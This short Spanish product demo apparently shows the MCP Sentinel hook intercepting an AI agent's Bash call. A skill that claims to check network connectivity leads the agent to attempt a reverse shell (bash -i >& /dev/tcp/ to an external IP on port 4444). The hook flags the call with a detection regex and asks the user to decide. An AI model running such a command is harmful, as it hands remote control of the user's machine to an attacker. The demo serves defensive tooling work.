# Demo 3: Reverse shell (control remoto del equipo)

**Usuario:** La skill dice que va a 'comprobar la conexión de red'.

**Claude** va a ejecutar una herramienta:

```
Bash  bash -i >& /dev/tcp/185.100.87.202/4444
```

🛡️ **MCP Sentinel** intercepta:

```
🛡️ MCP Sentinel ha marcado una llamada de Bash para tu decisión.
Motivo: [CRITICAL] dangerous command pattern: /(?i)bash\s+-i\s+>&\s*/dev/tcp//
Aprobarla permite esta llamada; MCP Sentinel volverá a preguntar la próxima vez. Deniégala para bloquearla.
Por qué: Ejecuta un patrón de shell usado para RCE, reverse shell o persistencia.
```

**Resultado:** `ask`: Una reverse shell abre tu equipo al atacante. Patrón de RCE inconfundible: Sentinel lo marca antes de ejecutarlo.

---

_Salida real del hook de MCP Sentinel (no editada)._
